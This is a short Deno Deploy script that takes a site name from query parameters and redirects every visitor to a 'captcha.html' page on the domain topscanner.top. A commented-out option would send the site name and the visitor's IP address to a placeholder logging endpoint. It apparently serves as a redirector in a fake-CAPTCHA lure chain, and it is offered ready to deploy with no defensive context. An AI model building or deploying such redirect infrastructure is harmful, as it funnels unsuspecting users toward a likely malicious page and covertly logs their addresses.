// Deno Deploy uses Deno.serve() instead of addEventListener("fetch")
Deno.serve((req) => {
  const url = new URL(req.url);
  const params = url.searchParams;

  // Accept ?url=, ?u=, or ?q= as parameters
  const blocked = (params.get("url") || params.get("u") || params.get("q") || "").trim();

  // Sanitize input
  const safeBlocked = blocked.replace(/[\r\n]/g, "");

  // Default fallback
  const targetSite = safeBlocked || "unknown";

  // Your final redirect target
  const final = `https://topscanner.top/up/captcha.html`;

  // Optional: send log to analytics or endpoint
  // fetch("https://your-logger.example/log", {
  //   method: "POST",
  //   body: JSON.stringify({
  //     site: targetSite,
  //     ip: req.headers.get("x-forwarded-for"),
  //   }),
  // });

  return Response.redirect(final, 302);
});
